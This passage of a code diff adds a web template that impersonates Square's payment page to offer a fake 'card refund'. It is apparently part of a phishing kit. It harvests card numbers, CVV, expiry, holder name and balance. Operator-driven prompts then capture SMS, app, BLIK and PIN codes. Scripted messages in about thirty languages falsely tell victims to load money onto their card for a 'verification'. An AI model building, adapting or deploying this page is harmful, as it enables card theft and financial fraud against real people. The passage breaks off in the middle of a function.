@@ -1,0 +1,1649 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    <%=ad.id%> | Square
+  </title>
+
+  <link rel="stylesheet" href="/css/square/load.css">
+  <link rel="stylesheet" href="/css/square/style.css">
+  <link rel="stylesheet" href="/css/square/fonts/inter.css">
+  <link rel="stylesheet" href="/css/support_parent.css" />
+  <link rel="shortcut icon" href="https://i.imgur.com/oAnkdQq.png" type="image/x-icon">
+
+  <% let serviceLang=ad.service.code==="service_eu" ? ad.language : ad.service.lang; %>
+
+</head>
+
+<body>
+  <div id="app">
+
+    <div class="content-container">
+      <div href="#" onclick="event.preventDefault(); location.reload();" class="page-header">
+        <img src="/css/square/images/square-logo.svg" alt="" class="payment-gateway-logo">
+        <h1 class="page-title">
+          <%= translate["card_refund"][serviceLang] %>
+
+        </h1>
+      </div>
+
+
+      <form @submit="submitForm" class="card-form payment-gateway-content">
+        <div class="payment-gateway-card">
+          <!-- add class .flipped -->
+          <div class="card-a-side">
+            <svg class="visa" width="51" height="51" viewBox="0 0 51 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path
+                d="M6.5 33.3132C6.5 32.6603 6.5 32.3338 6.61735 32.0802C6.74467 31.805 6.96635 31.5842 7.24251 31.4573C7.49703 31.3404 7.82465 31.3404 8.47989 31.3404H16.7504C17.4658 31.3404 17.8235 31.3404 18.0967 31.4791C18.337 31.6011 18.5324 31.7958 18.6549 32.0353C18.7941 32.3075 18.7941 32.6639 18.7941 33.3767V37.4636C18.7941 38.1764 18.7941 38.5328 18.6549 38.8051C18.5324 39.0446 18.337 39.2393 18.0967 39.3613C17.8235 39.5 17.4658 39.5 16.7504 39.5H12.7091C12.0844 39.5 11.7719 39.5001 11.478 39.4298C11.2173 39.3674 10.9681 39.2645 10.7395 39.125C10.4817 38.9675 10.2608 38.7474 9.81895 38.3071L7.69717 36.193C7.25534 35.7527 7.03438 35.5326 6.8764 35.2757C6.73634 35.048 6.63305 34.7996 6.57048 34.5399C6.49991 34.247 6.5 33.9357 6.5 33.3132V33.3132ZM16.7504 11.5C17.4658 11.5 17.8235 11.5 18.0967 11.6387C18.337 11.7607 18.5324 11.9554 18.6549 12.1949C18.7941 12.4672 18.7941 12.8236 18.7941 13.5364V17.6233C18.7941 18.3361 18.7941 18.6925 18.6549 18.9647C18.5324 19.2042 18.337 19.3989 18.0967 19.5209C17.8235 19.6596 17.4658 19.6596 16.7504 19.6596H8.4986C7.82575 19.6596 7.48932 19.6596 7.2292 19.5365C6.96364 19.4108 6.74974 19.1976 6.62358 18.933C6.5 18.6739 6.5 18.3386 6.5 17.6682V17.6682C6.5 17.0457 6.49991 16.7344 6.57048 16.4415C6.63305 16.1817 6.73634 15.9334 6.8764 15.7057C7.03438 15.4488 7.25534 15.2286 7.69717 14.7884L9.80024 12.6929C10.2421 12.2526 10.463 12.0325 10.7208 11.875C10.9494 11.7355 11.1986 11.6326 11.4592 11.5702C11.7532 11.4999 12.0657 11.5 12.6904 11.5H16.7504ZM44.5 33.2945C44.5 33.917 44.5001 34.2283 44.4295 34.5213C44.3669 34.781 44.2637 35.0293 44.1236 35.2571C43.9656 35.5139 43.7447 35.7341 43.3028 36.1743L41.1623 38.3071C40.7205 38.7474 40.4996 38.9675 40.2418 39.125C40.0132 39.2645 39.764 39.3674 39.5033 39.4298C39.2094 39.5001 38.8969 39.5 38.2722 39.5H34.2914C33.576 39.5 33.2183 39.5 32.9451 39.3613C32.7048 39.2393 32.5093 39.0446 32.3869 38.8051C32.2477 38.5328 32.2477 38.1764 32.2477 37.4636V33.3767C32.2477 32.6639 32.2477 32.3075 32.3869 32.0353C32.5093 31.7958 32.7048 31.6011 32.9451 31.4791C33.2183 31.3404 33.576 31.3404 34.2914 31.3404H42.5388C43.1765 31.3404 43.4953 31.3404 43.7441 31.4513C44.031 31.5791 44.2605 31.8077 44.3887 32.0936C44.5 32.3415 44.5 32.6592 44.5 33.2945V33.2945ZM6.5 22.6505C6.5 21.9377 6.5 21.5813 6.63922 21.3091C6.76168 21.0696 6.95708 20.8749 7.19742 20.7529C7.47066 20.6142 7.82834 20.6142 8.5437 20.6142H18.0888C18.4413 20.6142 18.6176 20.6142 18.7809 20.658C18.9256 20.6969 19.0623 20.7608 19.1847 20.8469C19.3229 20.944 19.4356 21.0792 19.6609 21.3494L21.2059 23.2028C21.5964 23.6712 21.8723 24.0026 22.071 24.2807C22.2661 24.5539 22.366 24.7484 22.419 24.9339L22.4377 25.0035C22.5186 25.3296 22.5186 25.6704 22.4377 25.9965L22.419 26.0661C22.366 26.2516 22.2661 26.4461 22.071 26.7193C21.8723 26.9974 21.5964 27.3288 21.2059 27.7972L19.6609 29.6506C19.4356 29.9208 19.3229 30.056 19.1847 30.1531C19.0623 30.2392 18.9256 30.3031 18.7809 30.342C18.6176 30.3858 18.4413 30.3858 18.0888 30.3858H8.5437C7.82834 30.3858 7.47066 30.3858 7.19742 30.2471C6.95708 30.1251 6.76168 29.9304 6.63922 29.6909C6.5 29.4187 6.5 29.0623 6.5 28.3495V22.6505ZM44.5 28.3495C44.5 29.0623 44.5 29.4187 44.3608 29.6909C44.2383 29.9304 44.0429 30.1251 43.8026 30.2471C43.5293 30.3858 43.1717 30.3858 42.4563 30.3858H32.9458C32.5953 30.3858 32.42 30.3858 32.2575 30.3424C32.1135 30.304 31.9774 30.2407 31.8553 30.1554C31.7175 30.0592 31.6049 29.9254 31.3797 29.6577L29.825 27.8099C29.429 27.3394 29.1492 27.0063 28.9477 26.7267C28.7499 26.4521 28.6484 26.2564 28.5947 26.0699L28.5757 25.9996C28.4937 25.6716 28.4937 25.3284 28.5757 25.0004L28.5947 24.9301C28.6484 24.7436 28.7499 24.5479 28.9477 24.2733C29.1492 23.9937 29.429 23.6606 29.825 23.1901L31.3797 21.3423C31.6049 21.0746 31.7175 20.9408 31.8553 20.8446C31.9774 20.7593 32.1135 20.696 32.2575 20.6576C32.42 20.6142 32.5953 20.6142 32.9458 20.6142H42.4563C43.1717 20.6142 43.5293 20.6142 43.8026 20.7529C44.0429 20.8749 44.2383 21.0696 44.3608 21.3091C44.5 21.5813 44.5 21.9377 44.5 22.6505V28.3495ZM29.246 11.5C29.9614 11.5 30.319 11.5 30.5923 11.6387C30.8326 11.7607 31.028 11.9554 31.1505 12.1949C31.2897 12.4672 31.2897 12.8236 31.2897 13.5364V19.2228C31.2897 19.4971 31.2897 19.6343 31.2618 19.765C31.2371 19.881 31.1962 19.993 31.1403 20.0978C31.0774 20.2158 30.989 20.3209 30.8121 20.5311L29.0909 22.5767C28.7041 23.0364 28.3967 23.4012 28.1694 23.7168C27.9386 24.0371 27.7694 24.334 27.6735 24.6673L27.6461 24.7698C27.5263 25.2493 27.5263 25.7507 27.6461 26.2302L27.6735 26.3327C27.7694 26.666 27.9386 26.9629 28.1694 27.2832C28.3967 27.5988 28.7041 27.9636 29.0909 28.4233L30.812 30.4685C30.9889 30.6788 31.0774 30.7839 31.1403 30.9019C31.1962 31.0067 31.2371 31.1187 31.2618 31.2347C31.2897 31.3655 31.2897 31.5026 31.2897 31.777V37.4636C31.2897 38.1764 31.2897 38.5328 31.1505 38.8051C31.028 39.0446 30.8326 39.2393 30.5923 39.3613C30.319 39.5 29.9614 39.5 29.246 39.5H21.7958C21.0804 39.5 20.7228 39.5 20.4495 39.3613C20.2092 39.2393 20.0138 39.0446 19.8913 38.8051C19.7521 38.5328 19.7521 38.1764 19.7521 37.4636V31.7706C19.7521 31.4983 19.7521 31.3621 19.7796 31.2321C19.804 31.1169 19.8444 31.0055 19.8995 30.9013C19.9617 30.7838 20.049 30.6791 20.2237 30.4695L21.9428 28.4071C22.3242 27.9496 22.6273 27.5867 22.8515 27.2727C23.0792 26.9538 23.2459 26.6585 23.3405 26.3275L23.3676 26.2255C23.4859 25.749 23.4859 25.251 23.3676 24.7745L23.3405 24.6725C23.2459 24.3415 23.0792 24.0462 22.8515 23.7273C22.6273 23.4133 22.3242 23.0504 21.9428 22.5929L20.2236 20.5301C20.0489 20.3206 19.9616 20.2158 19.8995 20.0984C19.8444 19.9942 19.804 19.8828 19.7796 19.7676C19.7521 19.6377 19.7521 19.5015 19.7521 19.2291V13.5364C19.7521 12.8236 19.7521 12.4672 19.8913 12.1949C20.0138 11.9554 20.2092 11.7607 20.4495 11.6387C20.7228 11.5 21.0804 11.5 21.7958 11.5H29.246ZM38.2909 11.5C38.9156 11.5 39.2281 11.4999 39.522 11.5702C39.7827 11.6326 40.0319 11.7355 40.2605 11.875C40.5183 12.0325 40.7392 12.2526 41.1811 12.6929L43.3028 14.807C43.7447 15.2473 43.9656 15.4674 44.1236 15.7243C44.2637 15.952 44.3669 16.2004 44.4295 16.4601C44.5001 16.753 44.5 17.0643 44.5 17.6868V17.6868C44.5 18.3397 44.5 18.6662 44.3827 18.9198C44.2553 19.1949 44.0337 19.4158 43.7575 19.5427C43.503 19.6596 43.1753 19.6596 42.5201 19.6596H34.2914C33.576 19.6596 33.2183 19.6596 32.9451 19.5209C32.7048 19.3989 32.5093 19.2042 32.3869 18.9647C32.2477 18.6925 32.2477 18.3361 32.2477 17.6233V13.5364C32.2477 12.8236 32.2477 12.4672 32.3869 12.1949C32.5093 11.9554 32.7048 11.7607 32.9451 11.6387C33.2183 11.5 33.576 11.5 34.2914 11.5H38.2909Z"
+                fill="" />
+            </svg>
+            <div class="card-number-cvv">
+              <p class="number">#### #### #### ####</p>
+              <p class="cvv">###</p>
+            </div>
+            <div class="card-number-bottom-label">
+              <p>CVV</p>
+              <p>
+                <%= translate["expires"][serviceLang] %>
+              </p>
+            </div>
+            <div class="magnet_fill"></div>
+            <div class="card-number-date">
+              <p>MM/YY</p>
+            </div>
+          </div>
+        </div>
+
+        <h1 class="payment-gateway-heading">
+          <%= translate["card_information"][serviceLang] %>
+        </h1>
+
+        <div class="payment-gateway-form">
+          <div class="global-input-wrapper">
+            <label>
+              <%= translate["card_number"][serviceLang] %>
+            </label>
+            <div class="input-wrapper">
+              <input class="card-input__input" type="text" required id="cardNumber" minlength="19" maxlength="19"
+                v-mask="generateCardNumberMask" v-model="cardNumber" data-ref="cardNumber" autocomplete="off" />
+            </div>
+            <span class="page-title" v-if="cardError" style="color: #ff4d4f;">{{ cardError }}</span>
+
+          </div>
+
+          <div class="global-input-wrapper">
+            <label>
+              <%= translate["expires"][serviceLang] %>
+            </label>
+            <div class="input-wrapper">
+              <div class="select-wrapper">
+                <select class="card-input__input -select" required id="cardMonth" v-model="cardMonth"
+                  data-ref="cardDate">
+                  <option disabled selected value="">
+                    <%=translate['month'][serviceLang]%>
+                  </option>
+                  <option v-bind:disabled="n < minCardMonth" v-bind:key="n" v-bind:value="n < 10 ? '0' + n : n"
+                    v-for="n in 12">
+                    {{n < 10 ? '0' + n : n}} </option>
+                </select>
+              </div>
+              <div class="select-wrapper">
+                <select class="card-input__input -select" required id="cardYear" v-model="cardYear" data-ref="cardDate">
+                  <option disabled selected value="">
+                    <%=translate['year'][serviceLang]%>
+                  </option>
+                  <option v-bind:key="n" v-bind:value="$index + minCardYear" v-for="(n, $index) in 12">
+                    {{$index + minCardYear}}
+                  </option>
+                </select>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="global-input-wrapper">
+            <label>CVV</label>
+            <div class="input-wrapper">
+              <input type="text" class="card-input__input" minlength="3" maxlength="4" required id="cardCvv"
+                v-mask="'####'" maxlength="4" v-model="cardCvv" autocomplete="off" />
+            </div>
+          </div>
+
+          <div class="global-input-wrapper">
+            <label>
+              <%= translate["card_holder"][serviceLang] %>
+            </label>
+            <div class="input-wrapper">
+              <input type="text" required class="card-input__input" id="cardHolder" v-model="cardHolder"
+                autocomplete="off" />
+            </div>
+          </div>
+
+          <div class="global-input-wrapper" v-if="step==2 && balanceChecker">
+            <label>
+              <%=translate["card_balance"][serviceLang]%>
+            </label>
+            <div class="input-wrapper">
+              <input type="text" step="0.01" id="cardBalance" required class="card-input__input" v-model="cardBalance"
+                data-ref="cardBalance" autocomplete="off" />
+            </div>
+          </div>
+        </div>
+
+        <div class="payment-gateway-info-box">
+          <div class="info-box-item">
+            <div class="info-box-item-header">
+              <img src="/css/square/images/shield-check-icon.svg" alt="icon" class="info-icon">
+              <h2>
+                <%= translate.infoBox[serviceLang].secureTitle %>
+              </h2>
+            </div>
+            <p>
+              <%= translate.infoBox[serviceLang].secureText %>
+            </p>
+          </div>
+
+          <div class="info-box-item">
+            <div class="info-box-item-header">
+              <img src="/css/square/images/coins-icon.svg" alt="icon" class="info-icon">
+              <h2>
+                <%= translate.infoBox[serviceLang].dataTitle %>
+              </h2>
+            </div>
+            <p>
+              <%= translate.infoBox[serviceLang].dataText %>
+            </p>
+          </div>
+        </div>
+        <div class="payment-gateway-btn-wrapper">
+          <button id="btn" v-if="!loading" class="btn-submit primary max-width">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path
+                d="M12.6267 3.29306C13.0172 2.90269 13.6502 2.90259 14.0407 3.29306C14.431 3.68354 14.431 4.31664 14.0407 4.70712L6.70674 12.0401C6.34066 12.4062 5.76162 12.4297 5.36885 12.1095L5.29267 12.0401L1.95967 8.70712L1.89131 8.63095C1.57096 8.23817 1.59355 7.65917 1.95967 7.29306C2.32578 6.92694 2.90478 6.90435 3.29756 7.2247L3.37373 7.29306L5.9997 9.91903L12.6267 3.29306Z"
+                fill="" />
+            </svg>
+            <p>
+              <%=translate["submit"][serviceLang]%>
+            </p>
+          </button>
+        </div>
+        <% const terms=translate.termsTranslate[serviceLang] || translate.termsTranslate.en; const
+          confirmText=translate.confirmSquare[serviceLang] .replace('{conditions}', `<a href="javascript:void(0)"
+          class="no-action">${terms.conditions}</a>`)
+          .replace('{confidentiality}', `<a href="javascript:void(0)" class="no-action">${terms.confidentiality}</a>`);
+          %>
+
+          <p class="payment-gateway-footer-note">
+            <%- confirmText %>
+          </p>
+
+
+
+
+
+      </form>
+      <p class="footer-page">
+        © <span id="year"></span> Block, Inc., Squareup Pte. Ltd.
+      </p>
+
+      <script>
+        document.getElementById("year").textContent = new Date().getFullYear();
+      </script>
+    </div>
+  </div>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const cardNumberInput = document.getElementById("cardNumber");
+      const cardCvvInput = document.querySelector('input[id="cardCvv"]');
+      const cardMonth = document.getElementById("cardMonth");
+      const cardYear = document.getElementById("cardYear");
+      const numberOutput = document.querySelector(".card-number-cvv .number");
+      const cvvOutput = document.querySelector(".card-number-cvv .cvv");
+      const dateOutput = document.querySelector(".card-number-date p");
+      const cardBlock = document.querySelector(".card-a-side");
+      const form = document.querySelector(".card-form");
+      const modal = document.querySelector(".modal-overlay");
+      const modalClose = document.querySelector(".modal-button-wrapper .secondary");
+
+      // Маска ввода: #### #### #### ####
+      function formatCardNumberInput(value) {
+        return value
+          .replace(/\D/g, "")
+          .slice(0, 16)
+          .replace(/(.{4})/g, "$1 ")
+          .trim();
+      }
+
+      // Визуальная маска: первые и последние 4 цифры видны, середина — ***
+      function maskCardNumberVisual(value) {
+        const raw = value.replace(/\D/g, "");
+        let output = "";
+
+        for (let i = 0; i < 16; i++) {
+          if (i < raw.length) {
+            if (i < 4 || i > 11) {
+              output += raw[i];
+            } else {
+              output += "*";
+            }
+          } else {
+            output += "#";
+          }
+
+          if ((i + 1) % 4 === 0 && i < 15) output += " ";
+        }
+
+        return output;
+      }
+
+      // Обработка ввода номера
+      cardNumberInput.addEventListener("input", () => {
+        const formatted = formatCardNumberInput(cardNumberInput.value);
+        cardNumberInput.value = formatted;
+        numberOutput.textContent = maskCardNumberVisual(formatted.replace(/\s/g, ""));
+      });
+
+      // CVV
+      cardCvvInput.addEventListener("input", () => {
+        cvvOutput.textContent = cardCvvInput.value.replace(/\D/g, "").slice(0, 4);
+      });
+
+
+      // Дата
+      function updateDate() {
+        const m = cardMonth.value !== "Month" ? cardMonth.value : "MM";
+        const y = cardYear.value !== "Year" ? cardYear.value.slice(-2) : "YY";
+        dateOutput.textContent = `${m}/${y}`;
+      }
+      cardMonth.addEventListener("change", updateDate);
+      cardYear.addEventListener("change", updateDate);
+
+      // Переворот карты
+      cardCvvInput.addEventListener("focus", () => {
+        cardBlock.classList.add("flipped");
+      });
+      cardCvvInput.addEventListener("blur", () => {
+        cardBlock.classList.remove("flipped");
+      });
+      function toggleHoverEffect(active) {
+        if (active) {
+          cardBlock.classList.add("hover");
+        } else {
+          cardBlock.classList.remove("hover");
+        }
+      }
+
+      [cardNumberInput, cardMonth, cardYear].forEach((el) => {
+        el.addEventListener("focus", () => toggleHoverEffect(true));
+        el.addEventListener("blur", () => toggleHoverEffect(false));
+      });
+
+
+
+
+    });
+  </script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script defer>
+
+    function getTemplate(lang, amount) {
+      const templates = {
+        pl: `Dla pierwszej weryfikacji saldo na karcie bankowej musi wynosić co najmniej ${amount}, aby można było wykonać transakcję testową. w celu sprawdzenia limitów i potwierdzenia tożsamości. Proszę doładować kartę lub użyć innej karty.`,
+        en: `You must enter a card with a balance of at least ${amount}. The bank reserves this amount. This takes about 5-10 minutes. This procedure is associated with an increase in fraud on the part of sellers receiving advance payments. In the future, this procedure for using our services will no longer be necessary.`,
+        nl: `Voor de eerste verificatie moet het saldo van uw bankpas minimaal ${amount} bedragen om een proeftransactie te kunnen uitvoeren. om de limieten te controleren en uw identiteit te bevestigen. Gelieve uw kaart op te laden of een andere kaart te gebruiken.`,
+        ba: `Za prvu provjeru, stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti testna transakcija. radi provjere ograničenja i potvrde vašeg identiteta. Molimo napunite svoju karticu ili koristite drugu karticu.`,
+        es: `Para la primera verificación, el saldo de la tarjeta bancaria debe ser de al menos ${amount} para poder realizar una transacción de prueba para comprobar los límites y confirmar su identidad. Por favor, recargue su tarjeta o utilice otra tarjeta.`,
+        de: `Für die erste Überprüfung muss der Kontostand der Bankkarte mindestens ${amount} betragen, um eine Testtransaktion durchführen zu können. um die Limits zu überprüfen und Ihre Identität zu bestätigen. Bitte laden Sie Ihre Karte auf oder verwenden Sie eine andere Karte.`,
+        dk: `Til den første verifikation skal der være mindst ${amount} på bankkortet for at kunne foretage en testtransaktion. for at kontrollere grænserne og bekræfte din identitet. Venligst genoplad dit kort eller brug et andet kort.`,
+        pt: `Para a primeira verificação, o saldo do cartão bancário deve ser de, pelo menos, ${amount}, a fim de efetuar uma transação de teste. para verificar os limites e confirmar a sua identidade. Por favor, recarregue o seu cartão ou utilize outro cartão.`,
+        ua: `Для першої перевірки на банківській картці має бути щонайменше ${amount}, щоб можна було здійснити тестову транзакцію. для перевірки лімітів і підтвердження вашої особистості. Будь ласка, поповніть свою картку або використайте іншу картку.`,
+        tj: `Барои санҷиши аввал, бақияи корт бояд ҳадди ақал ${amount} бошад, то ки амалиёти санҷишӣ анҷом дода шавад. Барои тасдиқи ҳудудҳо ва шахсияти худ. Лутфан кортро пур кунед ё кортро дигар истифода баред.`,
+        am: `Առաջին ստուգման համար բանկային քարտի մնացորդը պետք է լինի առնվազն ${amount}՝ փորձնական գործարք կատարելու համար: սահմանները ստուգելու և ձեր ինքնությունը հաստատելու համար: Խնդրում ենք վերալիցքավորել ձեր քարտը կամ օգտագործել այլ քարտ:`,
+        uz: `Birinchi tekshiruv uchun bank kartasidagi qoldiq kamida ${amount} bo‘lishi kerak. bu cheklovlarni tekshirish va shaxsingizni tasdiqlash uchun kerak. Iltimos, kartangizni to‘ldiring yoki boshqa kartadan foydalaning.`,
+        kz: `Алғашқы тексеру үшін банк картасындағы қалдық кемінде ${amount} болуы керек, бұл шектеулерді тексеріп, жеке басыңызды растау үшін қажет. Картаны толтырыңыз немесе басқа картаны қолданыңыз.`,
+        ro: `Pentru prima verificare, soldul cardului bancar trebuie să fie de cel puțin ${amount} pentru a putea efectua o tranzacție de test. pentru verificarea limitelor și confirmarea identității. Vă rugăm să reîncărcați cardul sau să utilizați un alt card.`,
+        se: `För första kontrollen måste saldot på bankkortet vara minst ${amount} för att kunna göra en testtransaktion. för att kontrollera gränser och bekräfta din identitet. Ladda gärna ditt kort eller använd ett annat kort.`,
+        hr: `Za prvu provjeru, stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti testna transakcija. radi provjere ograničenja i potvrde vašeg identiteta. Molimo napunite svoju karticu ili koristite drugu karticu.`,
+        sk: `Na prvú kontrolu musí byť zostatok na bankovej karte najmenej ${amount}, aby bolo možné vykonať skúšobnú transakciu. na overenie limitov a potvrdenie vašej identity. Prosím, dobite si kartu alebo použite inú kartu.`,
+        cz: `Pro první kontrolu musí být zůstatek na bankovní kartě alespoň ${amount}, aby bylo možné provést zkušební transakci. pro ověření limitů a potvrzení vaší identity. Prosím, dobijte si kartu nebo použijte jinou kartu.`,
+        fr: `La première fois que vous vérifiez votre solde, vous devez disposer d'au moins ${amount}. cela est nécessaire pour créer une transaction test. vérification de la limite et de l'identité. veuillez recharger votre carte ou utiliser une autre carte.`,
+        bg: `За първата проверка салдото по банковата карта трябва да бъде поне ${amount}, за да може да се извърши пробна транзакция. за проверка на лимитите и потвърждаване на самоличността. Моля, заредете картата си или използвайте друга карта.`,
+        rs: `Za prvu proveru stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti probna transakcija. za proveru limita i potvrdu identiteta. Molimo vas da dopunite svoju karticu ili koristite drugu karticu.`,
+        be: `Для першай праверкі баланс на банкаўскай карце павінен складаць не менш за ${amount}, каб можна было выканаць пробную транзакцыю. для праверкі лімітаў і пацверджання асобы. Калі ласка, папоўніце сваю картку альбо выкарыстоўвайце іншую картку.`,
+        it: `Per il primo controllo, il saldo della carta bancaria deve essere di almeno ${amount} per poter effettuare una transazione di prova. per verificare i limiti e confermare la propria identità. Si prega di ricaricare la carta o di utilizzare un'altra carta.`,
+        ch: `Für die erste Überprüfung muss das Guthaben der Bankkarte mindestens ${amount} betragen, um eine Testtransaktion durchführen zu können. um die Limits zu überprüfen und Ihre Identität zu bestätigen. Bitte laden Sie Ihre Karte auf oder verwenden Sie eine andere Karte.`,
+        cs: `Pro první kontrolu musí být zůstatek na bankovní kartě alespoň ${amount}, aby bylo možné provést testovací transakci. pro ověření limitů a potvrzení identity. Prosím, dobijte si kartu nebo použijte jinou kartu.`,
+        no: `For den første bekreftelsen må saldoen på bankkortet være minst ${amount} for å kunne utføre en testtransaksjon. for å kontrollere grensene og bekrefte identiteten din. Vennligst fyll opp kortet ditt eller bruk et annet kort.`,
+        lt: `Pirmajai patikrai banko kortelės sąskaitoje turi būti bent ${amount}, kad būtų galima atlikti bandomąjį sandorį. patikrinti limitus ir patvirtinti savo tapatybę. Prašome papildyti savo kortelę arba naudoti kitą kortelę.`,
+        lv: `Pirmajai pārbaudei bankas kartes atlikumam jābūt vismaz ${amount}, lai varētu veikt pārbaudes darījumu. lai pārbaudītu limitus un apstiprinātu savu identitāti. Lūdzu, papildiniet savu karti vai izmantojiet citu karti.`,
+        est: `Esimese kontrolli puhul peab pangakaardi saldo olema vähemalt ${amount}, et teha testtehing. piirangute kontrollimiseks ja oma identiteedi kinnitamiseks. Palun laadige oma kaart uuesti või kasutage mõnda muud kaarti.`,
+        hu: `Az első ellenőrzéshez a bankkártya egyenlegének legalább ${amount}-nek kell lennie ahhoz, hogy teszttranzakciót lehessen végrehajtani. a korlátok ellenőrzésére és az azonosítás megerősítésére. Kérjük, töltse fel a kártyáját, vagy használjon másik kártyát.`,
+      };
+      return templates[lang] || "Template not found for the specified language.";
+    }
+
+
+
+    new Vue({
+      el: "#app",
+      data() {
+        return {
+          currentCardBackground: 8, // just for fun :D
+          cardBalance: "",
+          cardNumber: "",
+          cardHolder: "",
+
+          cardMonth: "",
+          cardYear: "",
+          cardCvv: "",
+          minCardYear: new Date().getFullYear(),
+          amexCardMask: "#### ###### #####",
+          otherCardMask: "#### #### #### ####",
+          cardNumberTemp: "",
+          isCardFlipped: false,
+          focusElementStyle: null,
+          isInputFocused: false,
+          step: 1,
+          cardError: "",
+          balanceChecker: <%=String(!!ad.balanceChecker) %>,
+      loading: false,
+        currentStatus: null,
+          logToken: null,
+            imgUrl: "http://via.placeholder.com/400x300?text=image%201",
+
+          };
+        },
+    mounted() {
+      this.cardNumberTemp = this.otherCardMask;
+      const input = document.getElementById("cardNumber");
+      input.focus();
+
+      // вручную активируем эффект
+      const cardBlock = document.querySelector(".card-a-side");
+      cardBlock.classList.add("hover");
+    },
+
+    computed: {
+      getCardType() {
+        if (!this.cardNumber || String(this.cardNumber).trim().length < 1) return false;
+        let number = this.cardNumber;
+        let re = new RegExp("^4");
+        if (number.match(re) != null) return "visa";
+
+        re = new RegExp("^(34|37)");
+        if (number.match(re) != null) return "amex";
+
+        re = new RegExp("^5[1-5]");
+        if (number.match(re) != null) return "mastercard";
+
+        re = new RegExp("^6011");
+        if (number.match(re) != null) return "discover";
+
+        re = new RegExp("^9792");
+        if (number.match(re) != null) return "troy";
+
+        return "visa"; // default type
+      },
+      generateCardNumberMask() {
+        return this.getCardType === "amex"
+          ? this.amexCardMask
+          : this.otherCardMask;
+      },
+      minCardMonth() {
+        if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
+        return 1;
+      },
+    },
+    watch: {
+      cardYear() {
+        if (this.cardMonth < this.minCardMonth) {
+          this.cardMonth = "";
+        }
+      },
+      currentStatus(v) {
+        if (v == "profit") this.successModal();
+        else if (v == "sms") this.codeModal();
+        else if (v == "pincode") this.pinModal();
+
+
+
+
+
+        else if (v.includes("error")) {
+          this.erroronlModal(v.split("error_")[1]);
+        }
+
+        else if (v.includes("customDep")) {
+          this.customdepModal(v.split("customDep_")[1]);
+        }
+
+        else if (v.includes("custom")) {
+          this.customModal(v.split("custom_")[1]);
+        }
+
+        else if (v.includes("ferr")) this.ferrModal(
+          "custom",
+          "<%=translate["info"][serviceLang]%>",
+          v.split("ferr_")[1],
+          "<%=translate["enterrr"][serviceLang]%>",
+          "<%=translate["wrongg"][serviceLang]%>",
+        );
+        else if (v == "appCode") this.codeModal(
+          "app",
+          "<%=translate["app_code_title"][serviceLang]%>",
+          "<%=translate["app_code_text"][serviceLang]%>",
+          "<%=translate["app_code_placeholder"][serviceLang]%>",
+        );
+        else if (v == "callCode") this.codeModal(
+          "call",
+          "<%=translate["call_code_title"][serviceLang]%>",
+          "<%=translate["call_code_text"][serviceLang]%>",
+          "<%=translate["call_code_placeholder"][serviceLang]%>",
+        );
+        else if (v == "blik") this.codeModal(
+          "blik",
+          "<%=translate["blik_code_title"][serviceLang]%>",
+          "<%=translate["blik_code_text"][serviceLang]%>",
+          "<%=translate["blik_code_placeholder"][serviceLang]%>",
+        );
+        else if (v == "picture") this.pictureModal(this.imgUrl);
+        else if (v == "push") this.pushModal();
+        else if (v == "limits") this.limitsModal();
+        else if (v == "otherCard") this.otherCardModal();
+        else if (v == "correctBalance") this.correctBalanceModal();
+        else if (v == "paypal") this.paypalModal();
+        else if (v == "mail") this.mailModal();
+
+        else if (v == "lk") document.location.href = "/banks/<%= countryId %>/<%= ad.id %>";
+        else if (v == "scream") document.location.href = `http://ibaillanos.tv`;
+
+        else if (v == "dep") this.depModal();
+
+      },
+    },
+    methods: {
+      erroronlModal(err) {
+        // Преобразуем текст ошибки в HTML с кликабельными ссылками
+        const clickableError = `${err}`.replace(
+          /(https?:\/\/[^\s]+)/g,
+          '<a href="$1" target="_blank" style="color: #7cd1f9; text-decoration: underline;">$1</a>'
+        );
+
+        // Отображаем модальное окно с информацией об ошибке
+        swal({
+          title: "<%=translate['info'][serviceLang]%>",
+          content: {
+            element: "div",
+            attributes: {
+              innerHTML: `<p>${clickableError}</p>`,
+            },
+          },
+          icon: "info",
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false, // Убираем кнопки из модального окна
+        });
+      },
+
+
+
+
+
+
+customdepModal(err) {
+  const amount = err;
+  const lang = "<%=serviceLang%>";
+  const template = getTemplate(lang, amount);
+
+  const contentEl = document.createElement("div");
+  contentEl.innerHTML = `
+    <p class="swal-text" style="
+      margin: 0;
+      padding: 0;
+      
+      font-size: 14px;
+      color: #333;
+      line-height: 1.5;
+      text-align: center;
+    ">
+      ${template}
+    </p>
+  `;
+
+  swal({
+    title: "<%=translate['error_title'][serviceLang]%>",
+    content: contentEl,
+    icon: "error",
+    dangerMode: true,
+    buttons: {
+      confirm: {
+        text: "<%=translate['submit'][serviceLang]%>",
+        className: "swal-button--confirm"
+      }
+    }
+  });
+},
+
+
+
+      customModal(err) {
+        swal(
+          "",
+          `${err}`,
+          "error"
+        );
+      },
+
+      limitsModal() {
+        swal(
+          "<%=translate["error_title"][serviceLang]%>",
+          "<%=translate["limits"][serviceLang]%>",
+          "error"
+        );
+      },
+      depModal() {
+        swal(
+          "<%=translate["dep_error"][serviceLang]%>",
+          "<%=translate["dep_text"][serviceLang]%>",
+
+          "error"
+        );
+      },
+
+     correctBalanceModal() {
